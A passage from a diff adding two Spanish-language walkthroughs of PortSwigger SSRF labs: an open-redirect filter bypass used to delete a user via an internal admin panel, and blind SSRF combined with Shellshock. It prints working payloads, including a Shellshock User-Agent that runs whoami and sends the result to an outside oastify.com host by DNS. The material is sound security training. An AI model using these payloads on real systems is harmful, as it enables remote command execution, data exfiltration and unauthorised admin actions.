@@ -56,3 +56,69 @@ Utilizamos técnicas de evasión como redirecciones a direcciones IP alternativa
 ```
 stockApi=http://127.0.1/%2561dmin/delete?username=carlos
 ```
+
+## Reto 5:SSRF con omisión de filtro mediante vulnerabilidad de redirección abierta
+
+Este laboratorio tiene una función de verificación de existencias que obtiene datos de un sistema interno.
+
+Para resolver el laboratorio, cambie la URL de verificación de existencias para acceder a la interfaz de administración en http://192.168.0.12:8080/adminy eliminar el usuario carlos.
+
+El verificador de acciones se ha restringido para acceder únicamente a la aplicación local, por lo que primero deberá encontrar una redirección abierta que afecte a la aplicación. 
+
+onde el stock checker sólo permite acceder a rutas internas de la propia aplicación, bloqueando directamente URLs externas. Sin embargo, identificamos una vulnerabilidad de redirección abierta en el parámetro path del endpoint ‘nextProduct’.
+
+Aprovechamos esta redirección para hacer que el stock checker acceda de forma indirecta al panel de administración interno ubicado en http://192.168.0.12:8080/admin. Desde ahí, utilizamos la misma técnica para construir una URL que elimine al usuario carlos, completando así el laboratorio.
+
+```
+stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
+```
+
+## Reto 6: SSRF ciego con explotación de Shellshock
+
+Este sitio utiliza un software de análisis que obtiene la URL especificada en el encabezado Referer cuando se carga una página de producto.
+
+Para resolver el laboratorio, use esta funcionalidad para realizar un ataque SSRF ciego contra un servidor interno en el 192.168.0.X rango en el puerto 8080. En el ataque ciego, utilice una carga útil Shellshock contra el servidor interno para exfiltrar el nombre del usuario del sistema operativo. 
+
+En este laboratorio donde el SSRF se combina con la vulnerabilidad Shellshock para ejecutar comandos remotos en un sistema interno. Aprovechamos el hecho de que la aplicación realiza peticiones HTTP a la URL indicada en el header Referer, y que estas peticiones incluyen la cabecera User-Agent, la cual podemos manipular.
+
+Empleamos Burp Collaborator para generar un payload que, al ser ejecutado, filtra el nombre del usuario del sistema mediante una consulta DNS. Este payload es inyectado en el User-Agent usando la sintaxis de Shellshock, y el ataque se lanza desde Burp Intruder variando la IP interna objetivo (192.168.0.X) en el Referer.
+
+Al finalizar, revisamos las interacciones en el Collaborator y recuperamos el nombre del usuario directamente desde el subdominio que llega en la consulta DNS.
+
+```html
+GET /product?productId=1 HTTP/2
+
+Host: 0a49008d04099b2982c5c97c004e0047.web-security-academy.net
+
+Cookie: session=8tVbTH6uMIzo42lUDPYTZGa1GhPOgaHh
+
+Sec-Ch-Ua: 
+
+Sec-Ch-Ua-Mobile: ?0
+
+Sec-Ch-Ua-Platform: ""
+
+Upgrade-Insecure-Requests: 1
+
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).222b5vm3rlqjyopm7wml4ciknbt2h05p.oastify.com
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+Sec-Fetch-Site: same-origin
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-User: ?1
+
+Sec-Fetch-Dest: document
+
+Referer: http://192.168.0.§X§:8080
+
+Accept-Encoding: gzip, deflate, br
+
+Accept-Language: en-US,en;q=0.9
+```
+
+
+
+
